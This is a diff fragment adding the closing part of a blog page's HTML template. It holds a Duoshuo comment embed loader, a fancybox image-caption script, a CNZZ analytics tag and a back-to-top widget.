+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1253479891'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1253479891' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
